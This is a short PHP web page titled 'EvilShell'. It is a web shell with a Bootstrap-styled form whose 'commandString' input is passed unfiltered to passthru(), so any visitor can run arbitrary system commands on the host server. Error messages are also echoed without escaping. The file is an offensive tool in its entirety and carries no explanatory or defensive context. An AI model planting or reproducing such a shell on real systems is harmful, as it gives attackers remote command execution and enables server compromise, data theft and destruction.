                   <!doctype html>
<html lang="en">

<head>
    <title>EvilShell</title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/main.css">
</head>

<body>
    <div class="container" id="glass">
        <div class="align-items-center justify-content-center row" style="min-height: 100vh;">
            <div class="col-sm-6 text-center">
                <form action="" method="get">
                    <h4 class="display-4">EvilShell</h4>
                    <div class="form-group">
                        <input type="text" name="commandString" class="form-control" id="commandString"
                            placeholder="Enter command..."> 
                    </div>
                    <button type="submit" class="btn btn-primary w-100">Submit</button>
                    <?php

                    if (isset($_GET["commandString"])) {
                        $command_string = $_GET["commandString"];
                        
                        try {
                            passthru($command_string);
                        } catch (Error $error) {
                            echo "<p class=mt-3><b>$error</b></p>";
                        }
                    }
                        
                ?>
                </form>
            </div>
        </div>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="js/bootstrap.min.js"></script>
</body>

</html> 
